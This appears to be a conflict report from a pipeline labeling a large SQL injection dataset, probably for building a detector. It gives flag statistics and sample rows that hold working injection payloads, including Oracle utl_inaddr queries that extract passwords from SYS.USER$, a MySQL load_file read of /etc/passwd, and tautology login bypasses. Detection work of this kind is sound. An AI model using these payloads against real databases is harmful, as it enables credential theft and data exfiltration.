# 05 - Conflict Report

Rows processed: `12,753,953`
Conflict rows: `10,828,030`
Conflict rate: `84.8994%`

## Conflict Flags

| Flag | Count | % |
|---|---:|---:|
| unresolved_label | 9,733,440 | 75.948% |
| none | 1,925,923 | 15.028% |
| weak_union_signal | 911,941 | 7.116% |
| benign_with_sql_signal | 76,513 | 0.597% |
| low_confidence_positive | 63,219 | 0.493% |
| weak_error_signal | 54,203 | 0.423% |
| weak_time_signal | 41,489 | 0.324% |
| multi_db_signal | 8,624 | 0.067% |
| engine_signal_mismatch | 553 | 0.004% |

## Example Conflicts

| Row ID | Technique | DB | Confidence | Flags | Payload sample |
|---:|---|---|---:|---|---|
| 1 | unknown | unknown | 0.0000 | unresolved_label | `create user name identified by pass123 temporary tablespace temp default tablespace users;` |
| 2 | error_based | oracle | 0.9500 | multi_db_signal | `AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 5 ) ) AND 'i' = 'i` |
| 5 | error_based | mssql | 0.8100 | weak_error_signal | `select name from syscolumns where id = ( select id from sysobjects where name = tablename' ) --` |
| 7 | union_based | mysql | 0.8200 | weak_union_signal | `1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100 ) ) ) ,1,1,1;` |
| 21 | error_based | mssql | 0.7800 | weak_error_signal | `1 and ascii ( lower ( substring ( ( select top 1 name from sysobjects where xtype = 'u' ) , 1, 1 ) ) ) > 116` |
| 23 | unknown | unknown | 0.0000 | unresolved_label | `admin" or "1" = "1"--` |
| 25 | unknown | unknown | 0.0000 | unresolved_label | `insert` |
| 28 | error_based | oracle | 0.9500 | multi_db_signal | `AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 8 ) ) AND 'i' = 'i` |
| 39 | union_based | mysql | 0.8200 | weak_union_signal | `1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...` |
| 49 | unknown | unknown | 0.0000 | unresolved_label | `or 1 --'` |
| 53 | union_based | unknown | 0.9200 | weak_union_signal | `\x27UNION SELECT` |
| 60 | benign | unknown | 0.8800 | benign_with_sql_signal | `or 2 between 1 and 3` |
| 72 | unknown | unknown | 0.0000 | unresolved_label | `char@39A+@SELECT` |
| 75 | time_blind | mssql | 0.9000 | weak_time_signal | `declare @s varchar ( 200 ) select @s = 0x73656c6 ...` |
| 80 | unknown | unknown | 0.0000 | unresolved_label | `$ ( sleep 50 )` |
| 90 | unknown | unknown | 0.0000 | unresolved_label | `1 and user_name ( ) = 'dbo'` |
| 97 | error_based | oracle | 0.9500 | multi_db_signal | `AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 6 ) ) AND 'i' = 'i` |
| 100 | unknown | unknown | 0.0000 | unresolved_label | `or 'text' > 't'` |
| 106 | error_based | oracle | 0.9500 | multi_db_signal | `AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 4 ) ) AND 'i' = 'i` |
| 107 | error_based | mysql | 0.7200 | weak_error_signal | `select * from information_schema.tables--` |
